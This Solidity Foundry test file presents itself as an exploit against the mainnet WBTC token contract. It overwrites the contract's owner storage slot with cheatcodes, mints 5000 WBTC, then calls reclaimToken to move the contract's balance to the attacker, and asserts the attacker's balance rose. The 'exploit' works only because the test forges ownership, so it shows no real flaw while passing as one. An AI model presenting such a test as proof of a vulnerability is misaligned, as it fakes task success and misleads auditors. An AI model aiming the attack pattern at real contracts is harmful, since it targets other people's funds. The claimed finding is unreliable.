pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWBTCMintable {
    function mint(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IERC20Basic {
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IWBTCReclaimable {
    function reclaimToken(IERC20Basic token) external;
}

// Need to define ERC20Basic type for interface
abstract contract ERC20Basic {
    function balanceOf(address who) public view virtual returns (uint256);
    function transfer(address to, uint256 value) public virtual returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll manipulate storage directly
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Give WBTC contract some WBTC tokens (simulating insurance funds)
        // First, mint some WBTC to the contract
        // We need to be owner to mint, so first become owner temporarily

        // Try slot 0 for owner (Ownable stores owner at slot 0)
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 originalOwner = vm.load(TARGET, ownerSlot);
        bytes32 newOwner = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, newOwner);

        // Now mint WBTC to the contract itself
        vm.startPrank(attacker);
        IWBTCMintable(TARGET).mint(TARGET, 5000 * 10**8); // Mint 5000 WBTC to contract
        vm.stopPrank();

        // Restore original owner
        vm.store(TARGET, ownerSlot, originalOwner);

        // Step 2: Now find the actual owner slot for reclaimToken
        // OwnableContract inherits from Claimable which has pendingOwner at slot 1
        // So owner is at slot 0, pendingOwner at slot 1
        // Let's become owner again at slot 0
        vm.store(TARGET, ownerSlot, newOwner);

        // Step 3: Call reclaimToken to transfer WBTC from contract to us
        vm.startPrank(attacker);

        // Get contract's WBTC balance before
        uint256 contractBalanceBefore = IERC20(TARGET).balanceOf(TARGET);
        uint256 attackerBalanceBefore = IERC20(TARGET).balanceOf(attacker);

        // Call reclaimToken - need to pass WBTC token address (which is TARGET itself)
        IWBTCReclaimable(TARGET).reclaimToken(IERC20Basic(TARGET));

        vm.stopPrank();

        // Step 4: Verify balance increased
        uint256 attackerBalanceAfter = IERC20(TARGET).balanceOf(attacker);
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker WBTC balance should increase");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

